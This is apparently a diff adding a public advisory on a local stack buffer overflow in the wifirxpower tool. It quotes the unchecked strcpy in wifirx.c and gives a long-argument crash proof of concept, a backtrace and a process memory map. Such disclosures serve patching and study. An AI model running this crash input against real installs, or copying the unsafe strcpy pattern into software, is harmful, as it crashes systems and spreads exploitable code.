@@ -1,0 +1,141 @@
+[+] Title: wifirxpower - Local Stack Based Buffer Overflow
+[+] Credits / Discovery: Nassim Asrir
+[+] Author Email: wassline@gmail.com || https://www.linkedin.com/in/nassim-asrir-b73a57122/
+[+] Author Company: Henceforth
+[+] CVE: N/A
+
+Vendor:
+===============
+
+https://github.com/cnlohr/wifirxpower
+  
+ 
+Download:
+===========
+
+https://github.com/cnlohr/wifirxpower
+ 
+ 
+Vulnerability Type:
+===================
+
+Local Stack Based Buffer Overflow
+
+
+issue:
+===================
+
+'wifirx.c' contain a vulnerable code in the line '111' the developer use the 'strcpy' function and does not check the buffer destination and cause a Stack Oveflow. 
+ 
+Vulnerable Code (102 - 124) wifirx.c:
+===================
+int GetQuality( const char * interface, int * noise )
+{
+	int sockfd;
+	struct iw_statistics stats;
+	struct iwreq req;
+
+
+	memset(&stats, 0, sizeof(stats));
+	memset(&req, 0, sizeof(struct iwreq));
+	strcpy( req.ifr_name, interface );
+	req.u.data.pointer = &stats;
+	req.u.data.length = sizeof(struct iw_statistics);
+#ifdef CLEAR_UPDATED
+	req.u.data.flags = 1;
+#endif
+
+	/* Any old socket will do, and a datagram socket is pretty cheap */
+	if((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
+		if( first ) perror("Could not create simple datagram socket");
+		first = 0;
+		//exit(EXIT_FAILURE);
+		return -1;
+	}
+ 
+
+Exploit:
+=========
+
+1 - ./wifirx aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+2 - r $(python -c 'print"A"*41')
+
+Backtrace: 
+=========
+/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x7ffff6ec3e37]
+/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x0)[0x7ffff6ec3e00]
+/home/bugtraq/Desktop/wifirxpower-master/wifirx[0x401aaa]
+/home/bugtraq/Desktop/wifirxpower-master/wifirx[0x401d21]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xed)[0x7ffff6ddb7ed]
+/home/bugtraq/Desktop/wifirxpower-master/wifirx[0x401449]
+
+Memory Map:
+===========
+00606000-0062a000 rw-p 00000000 00:00 0                                  [heap]
+7ffff6379000-7ffff638e000 r-xp 00000000 08:01 7606631                    /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ffff638e000-7ffff658d000 ---p 00015000 08:01 7606631                    /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ffff658d000-7ffff658e000 r--p 00014000 08:01 7606631                    /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ffff658e000-7ffff658f000 rw-p 00015000 08:01 7606631                    /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ffff658f000-7ffff6594000 r-xp 00000000 08:01 3027725                    /usr/lib/x86_64-linux-gnu/libXdmcp.so.6.0.0
+7ffff6594000-7ffff6793000 ---p 00005000 08:01 3027725                    /usr/lib/x86_64-linux-gnu/libXdmcp.so.6.0.0
+7ffff6793000-7ffff6794000 r--p 00004000 08:01 3027725                    /usr/lib/x86_64-linux-gnu/libXdmcp.so.6.0.0
+7ffff6794000-7ffff6795000 rw-p 00005000 08:01 3027725                    /usr/lib/x86_64-linux-gnu/libXdmcp.so.6.0.0
+7ffff6795000-7ffff6797000 r-xp 00000000 08:01 3027706                    /usr/lib/x86_64-linux-gnu/libXau.so.6.0.0
+7ffff6797000-7ffff6996000 ---p 00002000 08:01 3027706                    /usr/lib/x86_64-linux-gnu/libXau.so.6.0.0
+7ffff6996000-7ffff6997000 r--p 00001000 08:01 3027706                    /usr/lib/x86_64-linux-gnu/libXau.so.6.0.0
+7ffff6997000-7ffff6998000 rw-p 00002000 08:01 3027706                    /usr/lib/x86_64-linux-gnu/libXau.so.6.0.0
+7ffff6998000-7ffff699a000 r-xp 00000000 08:01 7602253                    /lib/x86_64-linux-gnu/libdl-2.15.so
+7ffff699a000-7ffff6b9a000 ---p 00002000 08:01 7602253                    /lib/x86_64-linux-gnu/libdl-2.15.so
+7ffff6b9a000-7ffff6b9b000 r--p 00002000 08:01 7602253                    /lib/x86_64-linux-gnu/libdl-2.15.so
+7ffff6b9b000-7ffff6b9c000 rw-p 00003000 08:01 7602253                    /lib/x86_64-linux-gnu/libdl-2.15.so
+7ffff6b9c000-7ffff6bb9000 r-xp 00000000 08:01 3015326                    /usr/lib/x86_64-linux-gnu/libxcb.so.1.1.0
+7ffff6bb9000-7ffff6db8000 ---p 0001d000 08:01 3015326                    /usr/lib/x86_64-linux-gnu/libxcb.so.1.1.0
+7ffff6db8000-7ffff6db9000 r--p 0001c000 08:01 3015326                    /usr/lib/x86_64-linux-gnu/libxcb.so.1.1.0
+7ffff6db9000-7ffff6dba000 rw-p 0001d000 08:01 3015326                    /usr/lib/x86_64-linux-gnu/libxcb.so.1.1.0
+7ffff6dba000-7ffff6f6e000 r-xp 00000000 08:01 7606751                    /lib/x86_64-linux-gnu/libc-2.15.so
+7ffff6f6e000-7ffff716d000 ---p 001b4000 08:01 7606751                    /lib/x86_64-linux-gnu/libc-2.15.so
+7ffff716d000-7ffff7171000 r--p 001b3000 08:01 7606751                    /lib/x86_64-linux-gnu/libc-2.15.so
+7ffff7171000-7ffff7173000 rw-p 001b7000 08:01 7606751                    /lib/x86_64-linux-gnu/libc-2.15.so
+7ffff7173000-7ffff7178000 rw-p 00000000 00:00 0 
+7ffff7178000-7ffff7188000 r-xp 00000000 08:01 3022902                    /usr/lib/x86_64-linux-gnu/libXext.so.6.4.0
+7ffff7188000-7ffff7387000 ---p 00010000 08:01 3022902                    /usr/lib/x86_64-linux-gnu/libXext.so.6.4.0
+7ffff7387000-7ffff7388000 r--p 0000f000 08:01 3022902                    /usr/lib/x86_64-linux-gnu/libXext.so.6.4.0
+7ffff7388000-7ffff7389000 rw-p 00010000 08:01 3022902                    /usr/lib/x86_64-linux-gnu/libXext.so.6.4.0
+7ffff7389000-7ffff738b000 r-xp 00000000 08:01 3022982                    /usr/lib/x86_64-linux-gnu/libXinerama.so.1.0.0
+7ffff738b000-7ffff758a000 ---p 00002000 08:01 3022982                    /usr/lib/x86_64-linux-gnu/libXinerama.so.1.0.0
+7ffff758a000-7ffff758b000 r--p 00001000 08:01 3022982                    /usr/lib/x86_64-linux-gnu/libXinerama.so.1.0.0
+7ffff758b000-7ffff758c000 rw-p 00002000 08:01 3022982                    /usr/lib/x86_64-linux-gnu/libXinerama.so.1.0.0
+7ffff758c000-7ffff75a4000 r-xp 00000000 08:01 7606754                    /lib/x86_64-linux-gnu/libpthread-2.15.so
+7ffff75a4000-7ffff77a3000 ---p 00018000 08:01 7606754                    /lib/x86_64-linux-gnu/libpthread-2.15.so
+7ffff77a3000-7ffff77a4000 r--p 00017000 08:01 7606754                    /lib/x86_64-linux-gnu/libpthread-2.15.so
+7ffff77a4000-7ffff77a5000 rw-p 00018000 08:01 7606754                    /lib/x86_64-linux-gnu/libpthread-2.15.so
+7ffff77a5000-7ffff77a9000 rw-p 00000000 00:00 0 
+7ffff77a9000-7ffff78a4000 r-xp 00000000 08:01 7606762                    /lib/x86_64-linux-gnu/libm-2.15.so
+7ffff78a4000-7ffff7aa3000 ---p 000fb000 08:01 7606762                    /lib/x86_64-linux-gnu/libm-2.15.so
+7ffff7aa3000-7ffff7aa4000 r--p 000fa000 08:01 7606762                    /lib/x86_64-linux-gnu/libm-2.15.so
+7ffff7aa4000-7ffff7aa5000 rw-p 000fb000 08:01 7606762                    /lib/x86_64-linux-gnu/libm-2.15.so
+7ffff7aa5000-7ffff7bd5000 r-xp 00000000 08:01 3015330                    /usr/lib/x86_64-linux-gnu/libX11.so.6.3.0
+7ffff7bd5000-7ffff7dd5000 ---p 00130000 08:01 3015330                    /usr/lib/x86_64-linux-gnu/libX11.so.6.3.0
+7ffff7dd5000-7ffff7dd6000 r--p 00130000 08:01 3015330                    /usr/lib/x86_64-linux-gnu/libX11.so.6.3.0
+7ffff7dd6000-7ffff7dda000 rw-p 00131000 08:01 3015330                    /usr/lib/x86_64-linux-gnu/libX11.so.6.3.0
+7ffff7dda000-7ffff7dfc000 r-xp 00000000 08:01 7606759                    /lib/x86_64-linux-gnu/ld-2.15.so
+7ffff7fd5000-7ffff7fdb000 rw-p 00000000 00:00 0 
+7ffff7ff7000-7ffff7ffb000 rw-p 00000000 00:00 0 
+7ffff7ffb000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
+7ffff7ffc000-7ffff7ffd000 r--p 00022000 08:01 7606759                    /lib/x86_64-linux-gnu/ld-2.15.so
+7ffff7ffd000-7ffff7fff000 rw-p 00023000 08:01 7606759                    /lib/x86_64-linux-gnu/ld-2.15.so
+7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+
+ 
+Tested on:
+=============== 
+
+Linux Ubuntu x86_64
+
+
+
+
+ 
+ 
